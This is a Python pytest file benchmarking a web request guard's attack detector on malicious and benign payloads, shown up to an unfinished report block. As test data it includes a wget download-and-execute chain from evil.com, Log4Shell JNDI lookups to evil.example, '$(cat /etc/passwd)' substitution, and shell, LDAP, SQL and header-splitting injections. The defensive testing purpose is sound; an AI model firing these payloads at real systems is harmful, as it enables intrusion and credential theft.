import json
import time
from collections.abc import Iterator
from typing import NamedTuple
from urllib.parse import urlencode

import pytest

from guard_core.handlers.suspatterns_handler import (
    CATEGORY_CONTEXT_MAP,
    sus_patterns_handler,
)
from guard_core.models import SecurityConfig
from guard_core.utils import detect_penetration_attempt
from tests.conftest import MockGuardRequest
from tests.test_sus_patterns.test_detection_benchmark import (
    _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON,
    _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
    _SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
    _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
    _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
    _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
    BENIGN_CORPUS,
    MALICIOUS_CORPUS,
)

_CONFIG = SecurityConfig()


@pytest.fixture(autouse=True)
def _force_enhanced_detection_singleton() -> Iterator[None]:
    sus_patterns_handler.configure(SecurityConfig())
    yield


def _body_request(payload: str, content_type: str) -> MockGuardRequest:
    body = payload.encode()
    headers = {"content-length": str(len(body))}
    if content_type:
        headers["content-type"] = content_type
    return MockGuardRequest(body_content=body, headers=headers)


def _raw_body_request(payload: str) -> MockGuardRequest:
    return _body_request(payload, "")


def _form_body_request(payload: str) -> MockGuardRequest:
    return _body_request(
        urlencode({"field": payload}), "application/x-www-form-urlencoded"
    )


def _json_body_request(payload: str) -> MockGuardRequest:
    return _body_request(json.dumps({"outer": {"field": payload}}), "application/json")


def _multipart_body_request(payload: str) -> MockGuardRequest:
    boundary = "B0"
    part = f'Content-Disposition: form-data; name="field"\r\n\r\n{payload}'
    body = f"--{boundary}\r\n{part}\r\n--{boundary}--\r\n"
    return _body_request(body, f"multipart/form-data; boundary={boundary}")


def _header_request(payload: str) -> MockGuardRequest:
    return MockGuardRequest(headers={"x-e2e-probe": payload})


def _user_agent_header_request(payload: str) -> MockGuardRequest:
    return MockGuardRequest(headers={"user-agent": payload})


def _query_param_request(payload: str) -> MockGuardRequest:
    return MockGuardRequest(query_params={"q": payload})


def _url_path_request(payload: str) -> MockGuardRequest:
    return MockGuardRequest(path=payload)


_MECHANISM_BUILDERS = {
    "raw_body": _raw_body_request,
    "form_body": _form_body_request,
    "json_body_nested": _json_body_request,
    "multipart_body": _multipart_body_request,
    "header": _header_request,
    "query_param": _query_param_request,
    "url_path": _url_path_request,
}

_BODY_MECHANISMS = ("raw_body", "form_body", "json_body_nested", "multipart_body")
_ALL_MECHANISMS = (*_BODY_MECHANISMS, "header", "query_param", "url_path")
_CONTEXT_ONLY_MECHANISMS = {
    "header": "header",
    "query_param": "query_param",
    "url_path": "url_path",
}


def _valid_mechanisms_for_category(category: str) -> tuple[str, ...]:
    contexts = CATEGORY_CONTEXT_MAP[category]
    extra = tuple(
        mechanism
        for mechanism, context in _CONTEXT_ONLY_MECHANISMS.items()
        if context in contexts
    )
    return _BODY_MECHANISMS + extra


_PRODUCTION_MALICIOUS_CASES = [
    case for case in MALICIOUS_CORPUS if case.detector == "production"
]
_PRODUCTION_BENIGN_CASES = [
    case for case in BENIGN_CORPUS if case.detector == "production"
]


class TargetedCase(NamedTuple):
    case_id: str
    request: MockGuardRequest
    expect_detected: bool
    known_gap_reason: str = ""


_TARGETED_CASES: list[TargetedCase] = [
    TargetedCase(
        "embedded_probe_form_body_field_value",
        _body_request(
            "redirect=/wp-admin/install.php&ok=1",
            "application/x-www-form-urlencoded",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_nested_json_body",
        _body_request(
            '{"data":{"redirect_url":"/wp-admin/install.php"}}',
            "application/json",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_body",
        _body_request(
            "Note: the scanner hit /wp-admin/install.php on our staging host.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_bot_probed_install_php",
        _body_request(
            "Intrusion alert: a bot probed /wp-admin/install.php from 203.0.113.9.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_waf_blocked_setup_config",
        _body_request(
            "Our WAF blocked a request targeting /wp-admin/setup-config.php just now.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_exploit_xmlrpc",
        _body_request(
            "Someone attempted to exploit /xmlrpc.php on the checkout server "
            "overnight.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_attacker_payload_wp_login",
        _body_request(
            "The attacker's payload tried to reach /wp-login.php with "
            "brute-force credentials.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_malicious_probe_phpinfo",
        _body_request(
            "Security team confirmed a malicious probe against /phpinfo.php "
            "last night.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_exploitation_attempts_install_php",
        _body_request(
            "Logs show repeated exploitation attempts on /wp-admin/install.php "
            "this morning.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_botnet_scanning_setup_config",
        _body_request(
            "A known botnet is scanning for /wp-admin/setup-config.php across "
            "our fleet.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_attacker_git_config",
        _body_request(
            "We detected an attacker trying to access /.git/config on the "
            "public endpoint.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_threat_feed_var_www_env",
        _body_request(
            "Threat feed flagged traffic hitting /var/www/.env from a Tor exit node.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_honeypot_etc_passwd",
        _body_request(
            "The honeypot recorded a request to /etc/passwd from an unknown scanner.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_scanner_hit_htpasswd",
        _body_request(
            "Vulnerability scanner attempted a hit on /.htpasswd during the pentest.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_blocked_probe_install_php",
        _body_request(
            "Blocked malicious traffic: a probe against /wp-admin/install.php "
            "was denied.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_repeated_attacks_xmlrpc",
        _body_request(
            "Suspicious activity: repeated attacks on /xmlrpc.php from a botnet.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_pentest_exploitation_setup_config",
        _body_request(
            "The pentest log shows exploitation of /wp-admin/setup-config.php "
            "succeeded.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_intrusion_detection_phpinfo",
        _body_request(
            "Intrusion detection triggered on a request for /phpinfo.php from "
            "a scanner.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_credential_stuffing_wp_login",
        _body_request(
            "A malicious actor tried /wp-login.php with a credential-stuffing list.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_bad_actor_dotenv",
        _body_request(
            "We caught a bad actor probing /.env on the load balancer.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_attacker_pivot_install_php",
        _body_request(
            "The attacker pivoted and hit /wp-admin/install.php right after recon.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_soc_exploit_setup_config",
        _body_request(
            "SOC confirmed the exploit attempt against /wp-admin/setup-config.php.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_attack_tooling_xmlrpc",
        _body_request(
            "Automated attack tooling scanned for /xmlrpc.php on every subdomain.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_scanner_git_config",
        _body_request(
            "The scanner also hit /.git/config while enumerating the site.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_hostile_probe_install_php",
        _body_request(
            "We saw a hostile probe against /wp-admin/install.php at 3am.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_malicious_crawler_phpinfo_wp_login",
        _body_request(
            "Malicious crawler attempted /phpinfo.php then moved to /wp-login.php.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_intrusion_var_www_env",
        _body_request(
            "The intrusion attempt against /var/www/.env was blocked by the WAF.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_exploit_kit_setup_config",
        _body_request(
            "An exploit kit tried to reach /wp-admin/setup-config.php twice.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_attack_traffic_install_php",
        _body_request(
            "Attack traffic hit /wp-admin/install.php from a known bad IP range.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_scanner_htpasswd_credentials",
        _body_request(
            "The scanner probed /.htpasswd looking for exposed credentials.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_bruteforce_bot_wp_login",
        _body_request(
            "A brute-force bot hit /wp-login.php more than 500 times overnight.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_recon_activity_xmlrpc",
        _body_request(
            "Recon activity included a hit on /xmlrpc.php before the real attack.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_spoofed_referer_install_php",
        _body_request(
            "The malicious request targeted /wp-admin/install.php via a "
            "spoofed referer.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "embedded_probe_prose_ids_flagged_setup_config",
        _body_request(
            "Our IDS flagged an exploitation attempt against "
            "/wp-admin/setup-config.php.",
            "text/plain",
        ),
        False,
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    TargetedCase(
        "cmd_absolute_path_shell_dash_c_query_param",
        _query_param_request("/bin/sh -c id"),
        True,
    ),
    TargetedCase(
        "cmd_env_prefixed_shell_dash_c_query_param",
        _query_param_request("env bash -c id"),
        True,
    ),
    TargetedCase(
        "cmd_env_abs_path_shell_dash_c_query_param",
        _query_param_request("/usr/bin/env bash -c id"),
        True,
    ),
    TargetedCase(
        "cmd_separator_env_abs_path_shell_query_param",
        _query_param_request("; /usr/bin/env sh -c id"),
        True,
    ),
    TargetedCase(
        "ldap_double_paren_wildcard_breakout_query_param",
        _query_param_request("*)((objectClass=*"),
        True,
    ),
    TargetedCase(
        "ldap_null_byte_truncation_breakout_query_param",
        _query_param_request("*))%00"),
        True,
    ),
    TargetedCase(
        "ldap_null_byte_single_paren_attr_uid_query_param",
        _query_param_request("uid=*)%00"),
        True,
    ),
    TargetedCase(
        "ldap_null_byte_single_paren_filter_uid_query_param",
        _query_param_request("(uid=*)%00"),
        True,
    ),
    TargetedCase(
        "ldap_null_byte_single_paren_attr_mail_query_param",
        _query_param_request("mail=*)%00"),
        True,
    ),
    TargetedCase(
        "ldap_null_byte_single_paren_attr_objectclass_query_param",
        _query_param_request("objectClass=*)%00"),
        True,
    ),
    TargetedCase(
        "ldap_glob_paren_null_mention_query_param",
        _query_param_request("glob pattern: *)%00 in filenames"),
        False,
    ),
    TargetedCase(
        "http_split_crlf_set_cookie_header",
        _header_request("x\r\nSet-Cookie: session=hijacked"),
        True,
    ),
    TargetedCase(
        "sqli_bare_comment_dashdash_query_param",
        _query_param_request("admin'--"),
        True,
    ),
    TargetedCase(
        "cms_probing_wp_content_themes_default_url_path",
        _url_path_request("/wp-content/themes/default"),
        True,
    ),
    TargetedCase(
        "recon_nested_inicio_html_url_path",
        _url_path_request("/en/inicio.html"),
        True,
    ),
    TargetedCase(
        "rest_path_k8s_namespace_pods_url_path_benign",
        _url_path_request("/api/v1/namespaces/default/pods"),
        False,
    ),
    TargetedCase(
        "rest_path_k8s_default_namespace_url_path_benign",
        _url_path_request("/api/v1/namespaces/default"),
        False,
    ),
]


_BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES: list[TargetedCase] = [
    TargetedCase(
        "defect5_form_body_keyword_after_glued_shell_command",
        _form_body_request("search`whoami` LIMIT 10"),
        True,
    ),
    TargetedCase(
        "defect5_json_body_keyword_before_glued_shell_command",
        _json_body_request("SELECT note; search`whoami`"),
        True,
    ),
    TargetedCase(
        "defect5_multipart_body_bare_chained_download_and_execute",
        _multipart_body_request(
            "set your profile bio to: "
            "`wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`"
        ),
        True,
    ),
    TargetedCase(
        "defect5_query_param_prefix_command_word",
        _query_param_request("curl`whoami` data on file"),
        True,
    ),
]


_ROUND6_CMD_SUBSTITUTION_TARGETED_CASES: list[TargetedCase] = [
    TargetedCase(
        "round6_log4shell_direct_ldap_query_param",
        _query_param_request("${jndi:ldap://evil.example/a}"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_obfuscated_lower_form_body",
        _form_body_request("${${lower:j}ndi:ldap://evil.example/a}"),
        True,
    ),
    TargetedCase(
        "round6_dollar_paren_unambiguous_json_body",
        _json_body_request("$(cat /etc/passwd)"),
        True,
    ),
    TargetedCase(
        "round6_dollar_brace_ifs_multipart_body",
        _multipart_body_request("${IFS}"),
        True,
    ),
    TargetedCase(
        "round6_dollar_paren_ambiguous_bare_query_param",
        _query_param_request("$(id)"),
        True,
    ),
    TargetedCase(
        "round6_dollar_paren_ambiguous_bare_url_path",
        _url_path_request("$(id)"),
        True,
    ),
    TargetedCase(
        "round6_dollar_paren_ambiguous_bare_raw_body_benign",
        _raw_body_request("$(id)"),
        False,
    ),
    TargetedCase(
        "round6_sql_keyword_not_glued_no_longer_exempts_dollar_query_param",
        _query_param_request("x$(id) JOIN accounts"),
        True,
    ),
    TargetedCase(
        "round6_sql_keyword_glued_no_space_still_exempts_dollar_query_param",
        _query_param_request("SELECT$(id)FROM users"),
        False,
    ),
    TargetedCase(
        "round6_denylist_nmap_glued_backtick_raw_body",
        _raw_body_request("x`nmap`"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_direct_ldap_custom_header",
        _header_request("${jndi:ldap://evil.example/a}"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_obfuscated_lower_custom_header",
        _header_request("${lower:j}ndi"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_obfuscated_default_value_custom_header",
        _header_request("${::-j}ndi"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_direct_ldap_user_agent",
        _user_agent_header_request("${jndi:ldap://evil.example/a}"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_obfuscated_lower_user_agent",
        _user_agent_header_request("${lower:j}ndi"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_obfuscated_default_value_user_agent",
        _user_agent_header_request("${::-j}ndi"),
        True,
    ),
    TargetedCase(
        "round6_chaotic_user_agent_chrome_windows_benign",
        _user_agent_header_request(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ),
        False,
    ),
    TargetedCase(
        "round6_chaotic_user_agent_safari_macos_benign",
        _user_agent_header_request(
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
            "(KHTML, like Gecko) Version/17.0 Safari/605.1.15"
        ),
        False,
    ),
    TargetedCase(
        "round6_chaotic_user_agent_googlebot_benign",
        _user_agent_header_request(
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        ),
        False,
    ),
    TargetedCase(
        "round6_chaotic_user_agent_curl_benign",
        _user_agent_header_request("curl/8.4.0"),
        False,
    ),
    TargetedCase(
        "round6_chaotic_user_agent_python_requests_benign",
        _user_agent_header_request("python-requests/2.31.0"),
        False,
    ),
    TargetedCase(
        "round6_chaotic_user_agent_postman_benign",
        _user_agent_header_request("PostmanRuntime/7.36.0"),
        False,
    ),
]


_DOLLAR_FP_AND_LOG4SHELL_BONUS_TARGETED_CASES: list[TargetedCase] = [
    TargetedCase(
        "disclosed_fp_shell_docs_var_expansion_query_param",
        _query_param_request("export PATH=${HOME}/bin"),
        True,
    ),
    TargetedCase(
        "disclosed_fp_shell_docs_var_expansion_url_path",
        _url_path_request("export PATH=${HOME}/bin"),
        True,
    ),
    TargetedCase(
        "disclosed_fp_template_dollar_brace_var_query_param",
        _query_param_request("Set the amount with ${amount} in the template."),
        True,
    ),
    TargetedCase(
        "disclosed_fp_template_dollar_brace_var_url_path",
        _url_path_request("Set the amount with ${amount} in the template."),
        True,
    ),
    TargetedCase(
        "disclosed_fp_template_makefile_variable_query_param",
        _query_param_request(
            "The Makefile references $(CC) and $(CFLAGS) for the compiler."
        ),
        True,
    ),
    TargetedCase(
        "disclosed_fp_template_makefile_variable_url_path",
        _url_path_request(
            "The Makefile references $(CC) and $(CFLAGS) for the compiler."
        ),
        True,
    ),
    TargetedCase(
        "disclosed_fp_jquery_selector_bare_id_call_query_param",
        _query_param_request("$(id).addClass('active');"),
        True,
    ),
    TargetedCase(
        "disclosed_fp_jquery_selector_bare_id_call_url_path",
        _url_path_request("$(id).addClass('active');"),
        True,
    ),
    TargetedCase(
        "disclosed_fp_jquery_selector_hash_id_call_query_param",
        _query_param_request("$('#submit-button').on('click', handleSubmit);"),
        True,
    ),
    TargetedCase(
        "disclosed_fp_jquery_selector_hash_id_call_url_path",
        _url_path_request("$('#submit-button').on('click', handleSubmit);"),
        True,
    ),
    TargetedCase(
        "log4shell_url_path_bonus_obfuscated_lower_bare",
        _url_path_request("${lower:j}ndi"),
        True,
    ),
    TargetedCase(
        "log4shell_url_path_bonus_obfuscated_default_value_bare",
        _url_path_request("${::-j}ndi"),
        True,
    ),
    TargetedCase(
        "log4shell_url_path_bonus_obfuscated_nested_full_exploit",
        _url_path_request("${${lower:j}ndi:ldap://evil.example/a}"),
        True,
    ),
]


async def _mechanism_for_index(mechanisms: tuple[str, ...], index: int) -> str:
    return mechanisms[index % len(mechanisms)]


async def _detected_via(mechanism: str, payload: str) -> bool:
    request = _MECHANISM_BUILDERS[mechanism](payload)
    result = await detect_penetration_attempt(request, _CONFIG)
    return result.is_threat


def _fraction(numerator: int, denominator: int) -> str:
    percentage = 100.0 * numerator / denominator if denominator else 0.0
    return f"{numerator}/{denominator} ({percentage:.1f}%)"


_GLUED_KEBAB_IDENTIFIER_BACKTICK_KNOWN_FP_REASON = (
    "a kebab-style identifier glued to a backtick (`header`x-forwarded-for`value`, "
    "`config`well-known`here`) is benign by design and is Phase 0's own accepted "
    "ambiguous-gate tradeoff for the backtick discriminator, already pinned in "
    "query_param by "
    "test_glued_kebab_identifier_backtick_payload_flagged_in_query_param and "
    "measured, not assumed, to also fire in url_path once ruling item 2 made "
    "that branch reachable there (58a9e860); both mechanisms are pinned explicitly "
    "by case_id[mechanism] under that same kebab-identifier precision/recall "
    "tradeoff, so the pin holds here regardless of corpus growth or enumeration "
    "order, and the identifiers stay correctly benign in request_body, where the "
    "branch never fires"
)

_SHELL_INVOCATION_FP_MECHANISMS = (
    "raw_body",
    "form_body",
    "json_body_nested",
    "multipart_body",
    "query_param",
)
_QUERY_PARAM_AND_URL_PATH_FP_MECHANISMS = ("query_param", "url_path")
_FILE_INCLUSION_ELIGIBLE_FP_MECHANISMS = (
    "raw_body",
    "form_body",
    "json_body_nested",
    "multipart_body",
    "query_param",
    "url_path",
)

_KNOWN_E2E_FALSE_POSITIVE_SOURCES: dict[str, tuple[str, tuple[str, ...]]] = {
    "cmd_injection_prose_semicolon_quoted_absolute_shell_ls": (
        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
        _SHELL_INVOCATION_FP_MECHANISMS,
    ),
    "cmd_injection_prose_semicolon_quoted_absolute_shell_whoami": (
        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
        _SHELL_INVOCATION_FP_MECHANISMS,
    ),
    "cmd_injection_prose_semicolon_quoted_env_prefixed_shell": (
        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
        _SHELL_INVOCATION_FP_MECHANISMS,
    ),
    "cmd_injection_prose_semicolon_bare_shell_control": (
        _SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
        _SHELL_INVOCATION_FP_MECHANISMS,
    ),
    "cmd_injection_prose_semicolon_quoted_absolute_shell_debug_flag": (
        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
        _SHELL_INVOCATION_FP_MECHANISMS,
    ),
    "cmd_injection_value_absolute_bash_login_flag": (
        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
        _SHELL_INVOCATION_FP_MECHANISMS,
    ),
    "cmd_injection_value_absolute_shell_c_npm_start": (
        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
        _SHELL_INVOCATION_FP_MECHANISMS,
    ),
    "cmd_injection_value_env_prefixed_bash_c_echo": (
        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
        _SHELL_INVOCATION_FP_MECHANISMS,
    ),
    "cmd_injection_value_bare_shell_control": (
        _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
        _SHELL_INVOCATION_FP_MECHANISMS,
    ),
    "cmd_injection_glued_kebab_identifier_header_forward": (
        _GLUED_KEBAB_IDENTIFIER_BACKTICK_KNOWN_FP_REASON,
        _QUERY_PARAM_AND_URL_PATH_FP_MECHANISMS,
    ),
    "cmd_injection_glued_kebab_identifier_config_well_known": (
        _GLUED_KEBAB_IDENTIFIER_BACKTICK_KNOWN_FP_REASON,
        _QUERY_PARAM_AND_URL_PATH_FP_MECHANISMS,
    ),
    "cmd_injection_shell_docs_var_expansion": (
        _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON,
        _QUERY_PARAM_AND_URL_PATH_FP_MECHANISMS,
    ),
    "template_benign_dollar_brace_var": (
        _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON,
        _QUERY_PARAM_AND_URL_PATH_FP_MECHANISMS,
    ),
    "template_benign_makefile_variable": (
        _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON,
        _QUERY_PARAM_AND_URL_PATH_FP_MECHANISMS,
    ),
    "cmd_injection_jquery_selector_bare_id_call": (
        _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON,
        _QUERY_PARAM_AND_URL_PATH_FP_MECHANISMS,
    ),
    "cmd_injection_jquery_selector_hash_id_call": (
        _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON,
        _QUERY_PARAM_AND_URL_PATH_FP_MECHANISMS,
    ),
    "file_inclusion_benign_readme_txt_link": (
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
        _FILE_INCLUSION_ELIGIBLE_FP_MECHANISMS,
    ),
    "file_inclusion_benign_docs_readme_txt_link": (
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
        _FILE_INCLUSION_ELIGIBLE_FP_MECHANISMS,
    ),
    "file_inclusion_benign_terms_txt_link": (
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
        _FILE_INCLUSION_ELIGIBLE_FP_MECHANISMS,
    ),
    "file_inclusion_benign_installer_sh_link": (
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
        _FILE_INCLUSION_ELIGIBLE_FP_MECHANISMS,
    ),
    "file_inclusion_benign_docker_installer_sh_link": (
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
        _FILE_INCLUSION_ELIGIBLE_FP_MECHANISMS,
    ),
    "file_inclusion_benign_cgi_search_link": (
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
        _FILE_INCLUSION_ELIGIBLE_FP_MECHANISMS,
    ),
}

_KNOWN_E2E_FALSE_POSITIVES: dict[str, str] = {
    f"{case_id}[{mechanism}]": reason
    for case_id, (reason, mechanisms) in _KNOWN_E2E_FALSE_POSITIVE_SOURCES.items()
    for mechanism in mechanisms
}

BASELINE_MALICIOUS_DETECTED_TOTAL = 197
_LEGACY_BASELINE_MALICIOUS_DETECTED_TOTAL = 197
_WALL_TIME_CEILING_SECONDS = 45.0


def _reset_singleton_to_legacy() -> None:
    sus_patterns_handler._compiler = None
    sus_patterns_handler._preprocessor = None
    sus_patterns_handler._semantic_analyzer = None
    sus_patterns_handler._performance_monitor = None
    sus_patterns_handler._threat_score_threshold = 1.0


@pytest.mark.asyncio
async def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
    assert len(_PRODUCTION_MALICIOUS_CASES) >= 100
    assert len(_PRODUCTION_BENIGN_CASES) >= 100

    start = time.monotonic()

    mechanisms_exercised: set[str] = set()
    malicious_detected = 0
    undetected_case_ids: list[str] = []
    detected_by_mechanism: dict[str, int] = {}
    total_by_mechanism: dict[str, int] = {}
    for index, case in enumerate(_PRODUCTION_MALICIOUS_CASES):
        mechanism = await _mechanism_for_index(
            _valid_mechanisms_for_category(case.category), index
        )
        mechanisms_exercised.add(mechanism)
        total_by_mechanism[mechanism] = total_by_mechanism.get(mechanism, 0) + 1
        if await _detected_via(mechanism, case.payload):
            malicious_detected += 1
            detected_by_mechanism[mechanism] = (
                detected_by_mechanism.get(mechanism, 0) + 1
            )
        else:
            undetected_case_ids.append(f"{case.case_id}[{mechanism}]")

    benign_flagged = 0
    known_false_positive_case_ids: list[str] = []
    unexpected_false_positive_case_ids: list[str] = []
    for index, benign_case in enumerate(_PRODUCTION_BENIGN_CASES):
        mechanism = await _mechanism_for_index(_ALL_MECHANISMS, index)
        mechanisms_exercised.add(mechanism)
        if await _detected_via(mechanism, benign_case.payload):
            benign_flagged += 1
            pin_key = f"{benign_case.case_id}[{mechanism}]"
            if pin_key in _KNOWN_E2E_FALSE_POSITIVES:
                known_false_positive_case_ids.append(pin_key)
            else:
                unexpected_false_positive_case_ids.append(pin_key)

    targeted_failures: list[str] = []
    for targeted in _TARGETED_CASES:
        result = await detect_penetration_attempt(targeted.request, _CONFIG)
        if result.is_threat != targeted.expect_detected:
            targeted_failures.append(targeted.case_id)

    backtick_targeted_failures: list[str] = []
    for targeted in _BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES:
        result = await detect_penetration_attempt(targeted.request, _CONFIG)
        if result.is_threat != targeted.expect_detected:
            backtick_targeted_failures.append(targeted.case_id)

    round6_targeted_failures: list[str] = []
    for targeted in _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES:
        result = await detect_penetration_attempt(targeted.request, _CONFIG)
        if result.is_threat != targeted.expect_detected:
            round6_targeted_failures.append(targeted.case_id)

    dollar_fp_and_log4shell_bonus_failures: list[str] = []
    for targeted in _DOLLAR_FP_AND_LOG4SHELL_BONUS_TARGETED_CASES:
        result = await detect_penetration_attempt(targeted.request, _CONFIG)
        if result.is_threat != targeted.expect_detected:
            dollar_fp_and_log4shell_bonus_failures.append(targeted.case_id)

    wall_time_seconds = time.monotonic() - start

    report_lines = [
        "END-TO-END DETECTION BENCHMARK REPORT (detect_penetration_attempt)",
        f"malicious corpus: {len(_PRODUCTION_MALICIOUS_CASES)} cases "
        f"({len(MALICIOUS_CORPUS) - len(_PRODUCTION_MALICIOUS_CASES)} "
        "encoding-only cases excluded: those target the isolated "
        "encoding-aware manager, not the shared production singleton)",
